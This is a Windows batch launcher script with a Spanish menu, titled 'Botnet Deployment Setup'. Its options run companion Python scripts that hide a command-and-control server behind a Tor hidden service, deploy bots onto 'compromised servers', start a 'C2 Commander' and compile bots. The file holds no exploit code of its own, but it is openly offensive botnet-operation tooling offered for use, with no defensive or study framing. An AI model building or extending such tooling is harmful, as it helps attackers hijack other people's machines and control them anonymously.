@echo off
REM Quick Start - Deployment Setup
title Botnet Deployment Setup

echo.
echo ========================================
echo   BOTNET DEPLOYMENT - QUICK START
echo ========================================
echo.
echo Elige una opcion:
echo.
echo [1] Setup TOR + C2 en tu PC (ANONIMO)
echo [2] Deploy en servers comprometidos
echo [3] Ver guia completa
echo [4] Iniciar C2 Commander
echo [5] Compilar bots
echo [0] Salir
echo.

set /p choice="Opcion: "

if "%choice%"=="1" goto setup_tor
if "%choice%"=="2" goto deploy_compromised
if "%choice%"=="3" goto show_guide
if "%choice%"=="4" goto start_c2
if "%choice%"=="5" goto compile_bots
if "%choice%"=="0" goto end

:setup_tor
echo.
echo [*] Configurando Tor Hidden Service...
python setup_tor_c2.py
pause
goto end

:deploy_compromised
echo.
echo [*] Iniciando deploy en servers comprometidos...
python deploy_compromised.py
pause
goto end

:show_guide
echo.
echo [*] Abriendo guia de deployment...
start DEPLOYMENT_GUIDE.md
pause
goto end

:start_c2
echo.
echo [*] Iniciando C2 Commander...
python c2_commander.py
pause
goto end

:compile_bots
echo.
echo [*] Compilando bots...
python compile_bot.py
pause
goto end

:end
echo.
echo Hasta luego!
timeout /t 2 >nul
